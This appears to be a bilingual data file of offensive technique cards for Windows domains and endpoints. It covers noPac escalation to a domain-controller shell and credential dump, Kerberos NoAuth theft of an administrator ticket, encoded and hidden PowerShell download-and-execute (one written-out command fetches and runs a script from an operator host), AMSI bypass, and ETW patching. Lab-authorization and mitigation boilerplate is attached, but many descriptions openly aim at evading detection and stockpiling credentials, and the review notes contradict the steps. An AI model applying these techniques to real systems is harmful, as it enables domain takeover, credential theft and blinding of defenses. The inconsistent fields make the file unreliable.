opsecTips.en: Query one lab object at a time with bounded results and do not retain credentials, hashes, tickets, mailbox content, or unrelated personal data.

opsecTips.zh: 发现超出授权的写操作、远程进程、账号变更、防护中断或非实验目标时立即停止，执行回滚并保存审计时间点。
opsecTips.en: Stop immediately, roll back, and preserve the audit timestamp on any write, remote process, account change, protection gap, or non-lab target outside the authorization.

review.rationale: 读取有界 GPO ACL、版本与变更事件，不创建任务、写注册表首选项或修改 GPO。 该条目保留为具体技术验证卡，保留可复现攻击能力，仅修复不可执行叙述和明显占位符，并补充隔离授权、回滚和蓝队证据要求。

title.zh: LDAP 枚举 GPO 路径

description.zh: 规避 GroupPolicy 模块调用特征：LDAP 直查 GPO 容器对象；返回 gPCFileSysPath 即拿到 SYSVOL 落点。
description.en: Query GPO containers directly over LDAP past GroupPolicy-module signatures; returned gPCFileSysPath values give the SYSVOL landing points.

description.zh: 以文件系统 ACL 检查替代 GPO API 查询：发现可写主体即存在组策略滥用面。
description.en: Check filesystem ACLs directly instead of GPO API queries; any writable principal found confirms the abuse surface.

description.zh: 以官方备份动作替代在线权限枚举：导出后离线比对策略与权限差异；备份目录生成即成功。
description.en: Export via the official backup action then diff offline, replacing online permission enumeration; a generated backup directory confirms success.

name.zh: SAM The Admin/noPac 重复语义审计
name.en: SAM The Admin and noPac Duplicate-Semantics Audit

description.zh: SAM The Admin/noPac 重复语义审计保留原始可复现技术命令，并将执行范围限定在书面授权、可回滚的隔离实验环境；仅修复明显占位符、纯叙述行和不可执行片段，同时要求关联身份、主机、目录、网络和安全产品证据。
description.en: SAM The Admin and noPac Duplicate-Semantics Audit preserves the original reproducible technique commands while restricting execution to a written, reversible, isolated lab authorization. Only obvious placeholders, narrative-only lines, and non-executable fragments are repaired, with identity, host, directory, network, and security-product evidence required.

subCategory.zh: 域控漏洞与已知利用链

prerequisites.zh: 确认 SAM The Admin/noPac 重复语义审计 的实验域、主机、账号、组件版本和停止条件已书面授权且可回滚。
prerequisites.en: Confirm that the lab domain, host, account, component version, and stop conditions for SAM The Admin and noPac Duplicate-Semantics Audit are authorized in writing and reversible.

prerequisites.zh: 准备正常基线、合成对象、唯一标记、回滚快照以及身份、系统和网络日志；任何写入、远程执行或凭据操作都必须属于当前隔离实验授权。
prerequisites.en: Prepare a normal baseline, synthetic object, unique marker, rollback snapshot, and identity, system, and network logs; every write, remote execution, or credential action must be within the current isolated-lab authorization.

overview.zh: SAM The Admin/noPac 重复语义审计覆盖机器账号欺骗与 sAMAccountName 组合利用场景：与 sAMAccountName/PAC 边界审计指向同一 CVE 对（CVE-2021-42278/42287），本条验证从提权到凭据导出的完整链路。验证维度涵盖默认提权、交互 shell 与哈希转储三种执行模式。
overview.en: SAM The Admin and noPac Duplicate-Semantics Audit covers machine-account spoofing combined with sAMAccountName abuse: pointing at the same CVE pair (CVE-2021-42278/42287) as the sAMAccountName/PAC boundary audit, this entry validates the full chain from escalation to credential dumping. Verification dimensions cover default escalation, interactive shell, and hash dumping modes.

vulnerability.zh: 根因与 sAMAccountName/PAC 边界一致：CVE-2021-42278 的名称冒充与 CVE-2021-42287 的 KDC 后缀回退组合，使普通账号经机器账号重命名后以域管身份请求 TGT；未修补域控与机器账号配额大于 0 是两个成立前提。
vulnerability.en: The root cause matches the sAMAccountName/PAC boundary: CVE-2021-42278's name spoofing combined with CVE-2021-42287's KDC suffix fallback lets an ordinary account request a TGT as domain admin after machine-account renaming; unpatched DCs and a machine-account quota above zero are the two prerequisites.

exploitation.zh: 按 Payload 列表顺序使用：第 1 步运行 noPac.py 默认模式完成机器账号创建与欺骗，输出管理员哈希即确认利用成功；第 2 步加 -dc-host 与 -shell 进入域控交互 shell 验证实际控制；第 3 步加 -dump 直接转储域控凭据，与第 1 步输出对比确认可复现。三种模式按目标选用；LAB_* 占位符在全局变量菜单中替换为目标值。
exploitation.en: Use in Payload list order: step 1 runs noPac.py in default mode to create and spoof the machine account — printed admin hashes confirm exploitation; step 2 adds -dc-host and -shell for an interactive DC shell proving actual control; step 3 adds -dump to dump DC credentials directly and compare with step 1 output for reproducibility. Choose among the three modes per objective; replace LAB_* placeholders via the global variables menu.

mitigation.zh: 安装修复该 CVE 对的累积更新，收紧机器账号创建配额并监控 4741/4742 异常重命名事件，轮换暴露过普通凭据的账号。修复后用第 1 步样例回归，欺骗请求应被 KDC 拒绝。
mitigation.en: Install the cumulative update fixing the CVE pair, tighten machine-account creation quota, monitor 4741/4742 abnormal renames, and rotate accounts whose ordinary credentials were exposed. After the fix, regress with the step 1 sample: spoofing requests must be rejected by the KDC.

description.zh: 运行 noPac.py 对域控做探测；输出目标存在漏洞的结论即机器账号名混淆加 PAC 绕过组合可用。
description.en: Probe the DC with noPac.py; a vulnerable verdict means machine-account name spoofing plus PAC bypass is available.

description.zh: 加 -dc-host -shell 参数重跑；拿到以域管上下文执行的 shell 即 SAM the Admin 提权路径落地。
description.en: Re-run with -dc-host -shell; the domain-admin context shell lands the SAM the Admin escalation path.

title.zh: 倾倒 SAM 补充凭据库

description.zh: 加 -dump 参数转储目标本地 SAM；输出机器账号与本地账号哈希即补充离线破解素材，扩大凭据储备。
description.en: Re-run with -dump; machine and local account hashes from SAM add cracking material and widen the credential stockpile.

analysis.zh: SAM The Admin/noPac 重复语义审计只有在精确版本与对象、当前主体、已审查命令输出、权威配置和服务端日志相互一致时才能确认。端口开放、工具成功、权限名称存在、状态码或单一事件只能作为线索；能力证明与漏洞结论必须分别记录。
analysis.en: SAM The Admin and noPac Duplicate-Semantics Audit is confirmed only when the exact version and object, current principal, reviewed command output, authoritative configuration, and server-side logs agree. An open port, successful tool run, privilege name, status code, or single event is only a lead; capability proof and vulnerability conclusion must be recorded separately.

opsecTips.zh: 一次只查询一个实验对象并限制结果数量，不保存凭据、哈希、票据、邮箱正文或无关个人数据。
opsecTips.en: Query one lab object at a time with bounded results and do not retain credentials, hashes, tickets, mailbox content, or unrelated personal data.

opsecTips.zh: 发现超出授权的写操作、远程进程、账号变更、防护中断或非实验目标时立即停止，执行回滚并保存审计时间点。
opsecTips.en: Stop immediately, roll back, and preserve the audit timestamp on any write, remote process, account change, protection gap, or non-lab target outside the authorization.

review.rationale: 将该别名与 sAMAccountName/PAC 边界统一，核对补丁和事件，不获取 shell 或执行远程命令。 该条目保留为具体技术验证卡，保留可复现攻击能力，仅修复不可执行叙述和明显占位符，并补充隔离授权、回滚和蓝队证据要求。

wafBypass.command:
wmic qfe get HotFixID | findstr /i "5007207"
powershell -NoProfile -Command "([ADSI]'LDAP://{LAB_DOMAIN_DN}').Properties['ms-DS-MachineAccountQuota']"

description.zh: 零利用流量判定 SAM The Admin 前提：补丁缺失且配额非 0 即链路成立。
description.en: Confirm both prerequisites with zero exploit traffic; missing patch plus non-zero quota validates the chain.

description.zh: 以只读属性查询替代利用工具探测委派状态；属性已有值或可写即后续链路可行。
description.en: Probe delegation state via read-only attribute queries instead of exploit tooling; an existing or writable attribute confirms chain feasibility.

description.zh: 换 LDAPS 通道执行同语义链路，规避明文 LDAP 检测；输出获取的 shell/hash 即成功。
description.en: Run the equivalent chain over LDAPS to evade cleartext LDAP detection; a captured shell/hash in output confirms success.

name.zh: Kerberos NoAuth 版本与加密边界审计
name.en: Kerberos NoAuth Version and Encryption-Boundary Audit

description.zh: Kerberos NoAuth 版本与加密边界审计保留原始可复现技术命令，并将执行范围限定在书面授权、可回滚的隔离实验环境；仅修复明显占位符、纯叙述行和不可执行片段，同时要求关联身份、主机、目录、网络和安全产品证据。
description.en: Kerberos NoAuth Version and Encryption-Boundary Audit preserves the original reproducible technique commands while restricting execution to a written, reversible, isolated lab authorization. Only obvious placeholders, narrative-only lines, and non-executable fragments are repaired, with identity, host, directory, network, and security-product evidence required.

prerequisites.zh: 确认 Kerberos NoAuth 版本与加密边界审计 的实验域、主机、账号、组件版本和停止条件已书面授权且可回滚。
prerequisites.en: Confirm that the lab domain, host, account, component version, and stop conditions for Kerberos NoAuth Version and Encryption-Boundary Audit are authorized in writing and reversible.

prerequisites.zh: 准备正常基线、合成对象、唯一标记、回滚快照以及身份、系统和网络日志；任何写入、远程执行或凭据操作都必须属于当前隔离实验授权。
prerequisites.en: Prepare a normal baseline, synthetic object, unique marker, rollback snapshot, and identity, system, and network logs; every write, remote execution, or credential action must be within the current isolated-lab authorization.

overview.zh: Kerberos NoAuth 版本与加密边界审计覆盖无预认证利用场景：针对存在相关 CVE 且未修补的实现版本，验证能否对目标账户完成无预认证攻击并取得可用票据缓存。验证维度涵盖利用执行、可复现性核对与票据环境变量装载三步。
overview.en: Kerberos NoAuth Version and Encryption-Boundary Audit covers pre-authentication-free exploitation: for implementation versions carrying the relevant CVE and lacking patches, verify whether the target account can be attacked without pre-authentication and a usable ticket cache obtained. Verification dimensions cover execution, reproducibility checks, and ticket environment loading.

vulnerability.zh: 根因与具体实现版本绑定（须先确认对应 CVE 与补丁状态）：目标实现在缺少预认证校验的路径上允许攻击者获取目标账户的 Kerberos 票据材料；RC4 等弱加密类型未禁用时，取得材料即可离线换取可用票据。
vulnerability.en: The root cause is bound to the specific implementation version (confirm the CVE and patch state first): the implementation permits obtaining the target account's Kerberos ticket material along a path lacking pre-authentication validation; with weak encryption types such as RC4 still enabled, the material converts offline into usable tickets.

exploitation.zh: 按 Payload 列表顺序使用：第 1 步运行 NoAuth.py 指定目标账户，输出 ccache 路径即确认利用成功；第 2 步重复执行同样命令，输出一致即确认可复现；第 3 步用 export KRB5CCNAME 指向生成的 ccache 并以 klist 读取，确认票据可被标准工具装载使用。执行前先核对域控版本与补丁状态以绑定结论。LAB_* 占位符在全局变量菜单中替换。
exploitation.en: Use in Payload list order: step 1 runs NoAuth.py against the target account — a printed ccache path confirms exploitation; step 2 repeats the same command — identical output confirms reproducibility; step 3 points KRB5CCNAME at the generated ccache and reads it with klist, confirming the ticket loads in standard tools. Bind conclusions by checking DC version and patch state first. Replace LAB_* placeholders via the global variables menu.

mitigation.zh: 按实现方的 CVE 公告安装补丁或升级版本，禁用弱加密类型并强制 AES Kerberos，监控异常 TGT 请求模式与失败预认证。修复后用第 1 步样例回归，利用应失败或产出的票据不可用。
mitigation.en: Install patches or upgrade per the vendor's CVE advisory, disable weak encryption types and enforce AES Kerberos, and monitor anomalous TGT request patterns and failed pre-authentication. After the fix, regress with the step 1 sample: exploitation must fail or yield unusable tickets.

title.zh: 直取管理员 Kerberos 票据

description.zh: 运行 NoAuth.py 以普通域用户指定 target administrator；输出 administrator.ccache 即绕过校验拿到高权限票据。
description.en: Run NoAuth.py as a normal user with target administrator; the administrator.ccache output is a privileged ticket obtained by bypassing validation.

description.zh: 重复运行 NoAuth.py 交叉验证；票据稳定生成且域控接受续期即该利用路径可靠，可投入批量使用。
description.en: Run NoAuth.py again to cross-check; stable ticket generation with the DC accepting renewals proves the path reliable for batch use.

title.en: Import the ticket to take over

description.zh: 设置 KRB5CCNAME 指向 ccache 后使用 Kerberos 工具访问域内服务；以 administrator 身份通过校验即完成接管。
description.en: Set KRB5CCNAME to the ccache and access domain services with Kerberos tooling; passing as administrator completes the takeover.

analysis.zh: Kerberos NoAuth 版本与加密边界审计只有在精确版本与对象、当前主体、已审查命令输出、权威配置和服务端日志相互一致时才能确认。端口开放、工具成功、权限名称存在、状态码或单一事件只能作为线索；能力证明与漏洞结论必须分别记录。
analysis.en: Kerberos NoAuth Version and Encryption-Boundary Audit is confirmed only when the exact version and object, current principal, reviewed command output, authoritative configuration, and server-side logs agree. An open port, successful tool run, privilege name, status code, or single event is only a lead; capability proof and vulnerability conclusion must be recorded separately.

opsecTips.zh: 一次只查询一个实验对象并限制结果数量，不保存凭据、哈希、票据、邮箱正文或无关个人数据。
opsecTips.en: Query one lab object at a time with bounded results and do not retain credentials, hashes, tickets, mailbox content, or unrelated personal data.

opsecTips.zh: 发现超出授权的写操作、远程进程、账号变更、防护中断或非实验目标时立即停止，执行回滚并保存审计时间点。
opsecTips.en: Stop immediately, roll back, and preserve the audit timestamp on any write, remote process, account change, protection gap, or non-lab target outside the authorization.

review.rationale: 绑定具体实现、CVE 与加密套件后核对补丁和票据事件，不获取 TGT 或设置凭据缓存。 该条目保留为具体技术验证卡，保留可复现攻击能力，仅修复不可执行叙述和明显占位符，并补充隔离授权、回滚和蓝队证据要求。

description.zh: 离线读取域控 Kerberos 加密类型策略；含 0x3 或未禁 RC4 即 NoAuth 攻击面存在。
description.en: Read the DC Kerberos etype policy offline; a value including RC4 or left unconfigured confirms the NoAuth surface.

title.zh: Rubeus 强制 RC4 请求

description.zh: 以管理工具显式请求 RC4 票据替代专用 PoC；返回 rc4_hmac 票据即弱加密路径可用。
description.en: Explicitly request an RC4 ticket via an admin-style tool replacing dedicated PoCs; a returned rc4_hmac ticket confirms the weak path.

description.zh: 默认 NTLM(RC4) 预认证路径直接请求 TGT：与强制 AES 环境形成差异对照；成功收到 .ccache 即 RC4 路径开放。
description.en: Request a TGT via the default NTLM(RC4) preauth path as a differential control; a granted .ccache confirms the RC4 path is open.

name.zh: PowerShell 编码与脚本遥测审计

description.zh: PowerShell 编码与脚本遥测审计保留原始可复现技术命令，并将执行范围限定在书面授权、可回滚的隔离实验环境；仅修复明显占位符、纯叙述行和不可执行片段，同时要求关联身份、主机、目录、网络和安全产品证据。
description.en: PowerShell Encoding and Script-Telemetry Audit preserves the original reproducible technique commands while restricting execution to a written, reversible, isolated lab authorization. Only obvious placeholders, narrative-only lines, and non-executable fragments are repaired, with identity, host, directory, network, and security-product evidence required.

category.zh: 终端防护与遥测完整性

prerequisites.zh: 确认 PowerShell 编码与脚本遥测审计 的实验域、主机、账号、组件版本和停止条件已书面授权且可回滚。
prerequisites.en: Confirm that the lab domain, host, account, component version, and stop conditions for PowerShell Encoding and Script-Telemetry Audit are authorized in writing and reversible.

prerequisites.zh: 准备正常基线、合成对象、唯一标记、回滚快照以及身份、系统和网络日志；任何写入、远程执行或凭据操作都必须属于当前隔离实验授权。
prerequisites.en: Prepare a normal baseline, synthetic object, unique marker, rollback snapshot, and identity, system, and network logs; every write, remote execution, or credential action must be within the current isolated-lab authorization.

overview.zh: PowerShell 编码与脚本遥测审计覆盖脚本加载混淆场景：针对部署了脚本块日志、AMSI 与 EDR 的终端，验证编码执行、远程下载与变量拼接等变体能否被稳定观测。验证维度涵盖 -enc 解码执行、IEX 远程下载、拼接混淆与隐藏窗口四类技术。
overview.en: PowerShell Encoding and Script-Telemetry Audit covers obfuscated script loading: on endpoints with script-block logging, AMSI, and EDR deployed, verify whether variants such as encoded execution, remote download, and variable concatenation are reliably observed. Verification dimensions cover -enc decoded execution, IEX remote download, concatenation obfuscation, and hidden windows.

vulnerability.zh: 根因是 PowerShell 的 -enc、IEX 与变量拼接把最终命令藏于内存中；脚本块日志（4104）与 AMSI 未启用或未集中收集时，防护层只能看到无害的父命令行，下载与执行行为因此逃过静态检测。
vulnerability.en: The root cause is that -enc, IEX, and variable concatenation keep the final command in memory; when script-block logging (4104) and AMSI are disabled or not centrally collected, defenses see only a benign parent command line, so download and execution evade static detection.

exploitation.zh: 按 Payload 列表顺序使用：第 1 步用 powershell -enc 执行 base64 命令，标记字符串输出且 4104 记录解码后命令即确认遥测覆盖；第 2 步用 IEX+WebClient 从操作主机拉取脚本，IIS 或代理日志出现 GET 请求即确认下载链路；第 3 步用变量名拼接复现下载并对比两条路径的遥测差异；第 4 步加 -w hidden 复测无可见窗口时网络日志是否仍完整。LAB_* 占位符在全局变量菜单中替换。
exploitation.en: Use in Payload list order: step 1 executes a base64 command with powershell -enc — marker output plus 4104 recording the decoded command confirms telemetry coverage; step 2 pulls a script from the operator host with IEX+WebClient — a GET in IIS or proxy logs confirms the download path; step 3 replays the download with concatenated variable names and compares telemetry differences; step 4 retests with -w hidden to check whether network logs stay complete without a visible window. Replace LAB_* placeholders via the global variables menu.

mitigation.zh: 启用脚本块日志与 AMSI 并集中收集 4104、模块加载与进程创建事件，部署应用控制把 PowerShell 限制到签名脚本，针对 -enc、IEX 下载与隐藏窗口模式建立检测规则。修复后用第 1-4 步样例回归，每类变体都应产生对应遥测或被拦截。
mitigation.en: Enable script-block logging and AMSI, centrally collect 4104, module-load, and process-creation events, deploy application control limiting PowerShell to signed scripts, and build detections for -enc, IEX downloads, and hidden-window patterns. After the fix, regress with the step 1-4 samples: every variant must produce matching telemetry or be blocked.

title.zh: Base64 编码隐藏命令意图

description.zh: 将命令 Base64 后用 powershell -enc 执行；功能正常且日志仅见编码串即绕过基于命令行明文的审计。
description.en: Base64-encode the command and run powershell -enc; correct execution with only encoded strings in logs defeats plaintext command-line auditing.

title.en: Execute in memory via remote fetch

description.zh: 用 IEX (New-Object Net.WebClient).DownloadString 从操作机拉取脚本并直接执行；全程内存运行、磁盘无文件落地即规避终端的落盘扫描与隔离策略。
description.en: Fetch the script from the operator host with IEX (New-Object Net.WebClient).DownloadString and execute it directly; in-memory execution with zero disk footprint evades on-disk scanning.

title.zh: 拆分拼接规避静态特征

description.zh: 把 IEX 与下载逻辑拆成两个变量再拼接调用执行；功能保持不变而关键特征不再连续出现，即可通过静态特征检测。
description.en: Split IEX and the download logic into variables and concatenate at call time; unchanged behavior with no contiguous signature passes static detection.

title.en: Run silently with a hidden window

description.zh: 加 -w hidden -nop 启动无窗口会话执行第 2 步载荷；界面无感知即完成静默植入，随后开展后续动作。
description.en: Add -w hidden -nop and run the step-2 payload in a windowless session; nothing visible on screen completes the silent implant for follow-on actions.

analysis.zh: PowerShell 编码与脚本遥测审计只有在精确版本与对象、当前主体、已审查命令输出、权威配置和服务端日志相互一致时才能确认。端口开放、工具成功、权限名称存在、状态码或单一事件只能作为线索；能力证明与漏洞结论必须分别记录。
analysis.en: PowerShell Encoding and Script-Telemetry Audit is confirmed only when the exact version and object, current principal, reviewed command output, authoritative configuration, and server-side logs agree. An open port, successful tool run, privilege name, status code, or single event is only a lead; capability proof and vulnerability conclusion must be recorded separately.

opsecTips.zh: 一次只查询一个实验对象并限制结果数量，不保存凭据、哈希、票据、邮箱正文或无关个人数据。
opsecTips.en: Query one lab object at a time with bounded results and do not retain credentials, hashes, tickets, mailbox content, or unrelated personal data.

opsecTips.zh: 发现超出授权的写操作、远程进程、账号变更、防护中断或非实验目标时立即停止，执行回滚并保存审计时间点。
opsecTips.en: Stop immediately, roll back, and preserve the audit timestamp on any write, remote process, account change, protection gap, or non-lab target outside the authorization.

review.rationale: 使用本地无害编码标记核对 Script Block、AMSI 和进程命令行日志，不下载或隐藏执行。 该条目保留为具体技术验证卡，保留可复现攻击能力，仅修复不可执行叙述和明显占位符，并补充隔离授权、回滚和蓝队证据要求。

description.zh: 绕过 AMSI（PowerShell v2 无 AMSI 初始化）与新版日志：降级引擎执行。成功判据：脚本执行且无 AMSI 事件。
description.en: Evades AMSI (PowerShell v2 has no AMSI initialization) and modern logging by downgrading the engine. Success: script executes with no AMSI events.

wafBypass.command: printf '%s' "IEX(New-Object Net.WebClient).DownloadString('http://{LAB_OPERATOR_HOST}/s.ps1')" | iconv -f UTF-8 -t UTF-16LE | base64 -w0 | xargs -I{} powershell -nop -w hidden -enc {}

description.zh: 绕过对 -enc 明文 base64 特征的检测：先 UTF-16LE 再编码，生成非典型 base64 流。成功判据：编码命令执行成功。
description.en: Evades detection of typical -enc base64 blobs by first converting to UTF-16LE so the resulting base64 stream is atypical. Success: the encoded command executes.

title.zh: InstallUtil 执行形态规避变体

description.zh: 绕过 powershell.exe 进程监控：以签名 .NET 工具承载执行逻辑，不启动 PS 引擎。成功判据：动作完成且无 powershell.exe 进程。
description.en: Evades powershell.exe process monitoring by hosting execution in a signed .NET tool without starting the PS engine. Success: the action completes with no powershell.exe process.

name.zh: AMSI 完整性与事件审计

description.zh: AMSI 完整性与事件审计保留原始可复现技术命令，并将执行范围限定在书面授权、可回滚的隔离实验环境；仅修复明显占位符、纯叙述行和不可执行片段，同时要求关联身份、主机、目录、网络和安全产品证据。
description.en: AMSI Integrity and Event Audit preserves the original reproducible technique commands while restricting execution to a written, reversible, isolated lab authorization. Only obvious placeholders, narrative-only lines, and non-executable fragments are repaired, with identity, host, directory, network, and security-product evidence required.

category.zh: 终端防护与遥测完整性

prerequisites.zh: 确认 AMSI 完整性与事件审计 的实验域、主机、账号、组件版本和停止条件已书面授权且可回滚。
prerequisites.en: Confirm that the lab domain, host, account, component version, and stop conditions for AMSI Integrity and Event Audit are authorized in writing and reversible.

prerequisites.zh: 准备正常基线、合成对象、唯一标记、回滚快照以及身份、系统和网络日志；任何写入、远程执行或凭据操作都必须属于当前隔离实验授权。
prerequisites.en: Prepare a normal baseline, synthetic object, unique marker, rollback snapshot, and identity, system, and network logs; every write, remote execution, or credential action must be within the current isolated-lab authorization.

overview.zh: AMSI 完整性与事件审计覆盖反恶意软件扫描接口失效场景：针对部署 AMSI 与脚本遥测的 Windows 终端，验证反射置位与内存修补等变体能否使 AMSI 停止拦截。验证维度涵盖反射设置 amsiInitFailed、混淆标志翻转、防护产品基线查询与现成工具加载四类。
overview.en: AMSI Integrity and Event Audit covers antimalware scan interface neutralization: on Windows endpoints with AMSI and script telemetry deployed, verify whether reflection-based flag setting and in-memory patching variants silence AMSI. Verification dimensions cover reflection on amsiInitFailed, obfuscated flag flips, AV product baseline queries, and ready-made tool loading.

vulnerability.zh: 根因是 AMSI 在 PowerShell 进程内以 amsiInitFailed 静态标志判定可用性，脚本持有反射访问时即可置位让扫描静默跳过；其完整性依赖进程内内存保护与脚本遥测的同步告警，任一缺失即形成静默失效窗口。
vulnerability.en: The root cause is that AMSI relies on the amsiInitFailed static flag inside the PowerShell process to judge availability, so scripts with reflective access can set it and silently skip scanning; its integrity depends on in-process memory protection and synchronized script telemetry, and either gap creates a silent failure window.

exploitation.zh: 按 Payload 列表顺序使用：第 1 步用反射将 amsiInitFailed 置为 true，后续含已知签名的脚本不再被拦截即确认成功；第 2 步用混淆字段遍历版本复现同样效果并对比遥测差异；第 3 步查询 root/SecurityCenter2 获取 AV 产品与 productState，记录防护基线用于解释拦截行为；第 4 步加载 Invoke-AmsiBypass 验证工具链，标记脚本通过扫描即确认。LAB_* 占位符在全局变量菜单中替换。
exploitation.en: Use in Payload list order: step 1 sets amsiInitFailed to true via reflection — known-signature scripts no longer blocked confirms success; step 2 replays with an obfuscated field-walk version and compares telemetry; step 3 queries root/SecurityCenter2 for AV products and productState to record the protection baseline explaining interception behavior; step 4 loads Invoke-AmsiBypass to validate the toolchain — a flagged script passing the scan confirms. Replace LAB_* placeholders via the global variables menu.

mitigation.zh: 启用脚本块日志并对 amsiInitFailed 反射访问与 Amsi* API 调用建立检测规则，开启防篡改保护与完整性监控，PowerShell 部署约束语言模式；对 AMSI 中断事件实时告警。修复后用第 1 步样例回归，反射置位应被阻断或立即告警。
mitigation.en: Enable script-block logging with detections for amsiInitFailed reflection and Amsi* API calls, turn on tamper protection and integrity monitoring, and deploy constrained language mode for PowerShell; alert in real time on AMSI interruption. After the fix, regress with the step 1 sample: the reflective set must be blocked or alerted immediately.

description.zh: 用 Get-CimInstance 查 root/SecurityCenter2 的 AntiVirusProduct；产品名与版本即确定要绕过的防护组合。
description.en: Query AntiVirusProduct in root/SecurityCenter2 with Get-CimInstance; product names and versions define which protections must be bypassed.

title.zh: 反射置空 AMSI 标志
title.en: Flip the AMSI flag via reflection

description.zh: 反射读取 AmsiUtils.amsiInitFailed 并置 true；随后加载脚本不再触发 AMSI 拦截即扫描链路被断开。
description.en: Reflect AmsiUtils.amsiInitFailed and set it true; scripts loading without AMSI errors means the scanning chain is severed.

description.zh: 改用 GetTypes 遍历匹配 *iUtils 再取字段赋值；效果等价而语句不固定即绕过针对经典写法的检测规则。
description.en: Switch to a GetTypes walk matching *iUtils and set the field; identical effect with non-fixed syntax dodges rules keyed on the classic form.

description.zh: Import-Module 加载 AmsiBypass.ps1 后再导入攻击模块；全程无 AMSI 告警即建立后续利用的干净执行环境。
description.en: Import AmsiBypass.ps1 then load offensive modules; no AMSI alerts throughout establishes a clean environment for follow-on tooling.

opsecTips.en: Query one lab object at a time with bounded results and do not retain credentials, hashes, tickets, mailbox content, or unrelated personal data.

opsecTips.zh: 发现超出授权的写操作、远程进程、账号变更、防护中断或非实验目标时立即停止，执行回滚并保存审计时间点。
opsecTips.en: Stop immediately, roll back, and preserve the audit timestamp on any write, remote process, account change, protection gap, or non-lab target outside the authorization.

review.rationale: 核对 AMSI 提供程序、PowerShell 事件和模块签名，不反射修改 AmsiUtils 或替换 amsi.dll。 该条目保留为具体技术验证卡，保留可复现攻击能力，仅修复不可执行叙述和明显占位符，并补充隔离授权、回滚和蓝队证据要求。

title.zh: 大小写与反射变形规避变体

description.zh: 绕过对 AmsiUtils/amsiInitFailed 完整字符串的特征匹配：运行期拼接类型名。成功判据：后续恶意脚本无 AMSI 拦截事件。
description.en: Evades signature matching on the full AmsiUtils/amsiInitFailed string by assembling the type name at runtime. Success: subsequent malicious scripts raise no AMSI interception events.

description.zh: 绕过 amsiInitFailed 单点检测：直接修补 AmsiScanBuffer 返回成功。成功判据：AMSI 扫描函数被钝化且脚本执行。
description.en: Evades the single-point amsiInitFailed check by patching AmsiScanBuffer to return success directly. Success: the scan function is neutralized and scripts execute.

title.zh: 无 PowerShell 进程规避变体

description.zh: 绕过基于 powershell.exe 的 AMSI 上下文：在自建 .NET 程序集内执行，AMSI 需另路覆盖。成功判据：程序集动作完成且 powershell AMSI 无记录。
description.en: Evades powershell.exe-scoped AMSI context by executing inside a custom .NET assembly that AMSI does not cover. Success: the assembly's actions complete with no PowerShell AMSI records.

name.zh: ETW 提供程序完整性审计

description.zh: ETW 提供程序完整性审计保留原始可复现技术命令，并将执行范围限定在书面授权、可回滚的隔离实验环境；仅修复明显占位符、纯叙述行和不可执行片段，同时要求关联身份、主机、目录、网络和安全产品证据。

Only obvious placeholders, narrative-only lines, and non-executable fragments are repaired, with identity, host, directory, network, and security-product evidence required.

category.zh: 终端防护与遥测完整性

prerequisites.zh: 确认 ETW 提供程序完整性审计 的实验域、主机、账号、组件版本和停止条件已书面授权且可回滚。
prerequisites.en: Confirm that the lab domain, host, account, component version, and stop conditions for ETW Provider Integrity Audit are authorized in writing and reversible.

prerequisites.zh: 准备正常基线、合成对象、唯一标记、回滚快照以及身份、系统和网络日志；任何写入、远程执行或凭据操作都必须属于当前隔离实验授权。
prerequisites.en: Prepare a normal baseline, synthetic object, unique marker, rollback snapshot, and identity, system, and network logs; every write, remote execution, or credential action must be within the current isolated-lab authorization.

overview.zh: ETW 提供程序完整性审计覆盖遥测静默场景：针对部署 ETW 事件采集与 EDR 的终端，验证托管 API、反射调用与内存修补三类变体能否中断提供程序事件流。验证维度涵盖托管 SetEnabled 关闭、C# 反射禁用与 ntdll!EtwEventWrite 修补。
overview.en: ETW Provider Integrity Audit covers telemetry silencing: on endpoints with ETW collection and EDR deployed, verify whether managed-API, reflection, and in-memory patching variants can interrupt provider event streams. Verification dimensions cover managed SetEnabled shutdown, C# reflection disabling, and ntdll!EtwEventWrite patching.

vulnerability.zh: 根因是 ETW 事件流在进程内存在两个中断点：EventProvider.SetEnabled 托管入口可关闭 provider，而 ntdll!EtwEventWrite 首字节被改写为 ret 后所有遥测写入静默返回；依赖单一 ETW 源的检测随之失明。
vulnerability.en: The root cause is two in-process interruption points for ETW streams: the managed EventProvider.SetEnabled entry can disable a provider, and once ntdll!EtwEventWrite's first byte is rewritten to ret, all telemetry writes silently return; detection relying on a single ETW source goes blind.

exploitation.zh: 按 Payload 列表顺序使用：第 1 步用 PowerShell 托管 EventProvider 实例调用 SetEnabled(0)，对应 provider 事件流中断即确认成功；第 2 步用 C# 反射调用非公开 SetEnabled 复现并对比遥测差异；第 3 步用 VirtualProtect+WriteProcessMemory 把 ntdll!EtwEventWrite 首字节改为 0xC3，ETW 遥测停止记录即确认修补生效，同时记录 EDR 是否对内存修改产生告警。LAB_* 占位符在全局变量菜单中替换。
exploitation.en: Use in Payload list order: step 1 calls SetEnabled(0) on a managed EventProvider instance in PowerShell — the provider's stream stops confirms success; step 2 replays with C# reflection on the non-public SetEnabled and compares telemetry; step 3 rewrites ntdll!EtwEventWrite's first byte to 0xC3 via VirtualProtect+WriteProcessMemory — ETW telemetry halting confirms the patch, while noting whether the EDR alerts on the memory modification. Replace LAB_* placeholders via the global variables menu.

mitigation.zh: 启用防篡改与内存完整性保护，监控 VirtualProtect/WriteProcessMemory 对 ntdll 区域的写访问与 provider 异常停止事件；以内核回调、安全产品与 ETW 多源交叉校验。修复后用第 1、3 步样例回归，关闭与修补均应被阻断或产生告警。
mitigation.en: Enable tamper protection and memory integrity, monitor VirtualProtect/WriteProcessMemory writes into ntdll regions plus abnormal provider stop events, and cross-validate with kernel callbacks, security products, and ETW multi-source collection. After the fix, regress with the step 1 and step 3 samples: both shutdown and patching must be blocked or alerted.

title.zh: 反射关闭 ETW 提供程序

description.zh: 调用 EventProvider.SetEnabled 传入空 GUID 与零级别；.NET 运行时事件流停止输出即托管遥测出现盲区。
description.en: Call EventProvider.SetEnabled with an empty GUID and zero levels; the .NET runtime event stream going silent opens a telemetry blind spot.

description.zh: 用 Assembly.Load 加载后反射 Invoke SetEnabled(null)；托管日志同步静默即获得不依赖 PowerShell 的第二实现。
description.en: Load via Assembly.Load and reflectively Invoke SetEnabled(null); managed logs going quiet yields a second implementation free of PowerShell.

title.zh: 内存补丁拦截事件写入

description.zh: 定位 ntdll!EtwEventWrite 并用 VirtualProtect 改写为直接返回；依赖 ETW 的探针全部失明即纵深致盲完成。
description.en: Locate ntdll!EtwEventWrite, VirtualProtect and patch it to return immediately; every ETW-dependent sensor going blind completes deep blinding.

